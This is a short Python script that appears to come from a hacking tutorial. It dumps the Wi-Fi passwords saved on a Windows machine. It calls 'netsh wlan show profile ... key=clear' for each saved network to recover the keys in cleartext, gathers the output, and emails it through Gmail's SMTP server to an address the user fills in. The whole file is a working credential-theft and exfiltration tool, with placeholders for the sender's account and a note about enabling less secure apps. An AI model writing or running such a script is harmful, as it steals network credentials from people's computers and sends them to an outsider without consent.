#!/usr/bin/env python

import subprocess  # run() function for shell commands
import smtplib     # protocol which handles sending e-mail and routing e-mail between mail servers
import re          # regural expressions


# function that sends an email to itself with a specific message
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # instanse of SMTP server, google's smtp server and port
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command  = "netsh wlan show profile"
networks = subprocess.run(command, capture_output=True, text=True).stdout
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.run(command, capture_output=True, text=True).stdout
    result = result + current_result

# fill the fields with your info
# !!DISCLAIMER for this function to work, you need to enable less secure apps to access Gmail.!!
# Link: https://myaccount.google.com/lesssecureapps
send_mail("<YOUR GMAIL>", "<YOUR PASSWORD>", result)
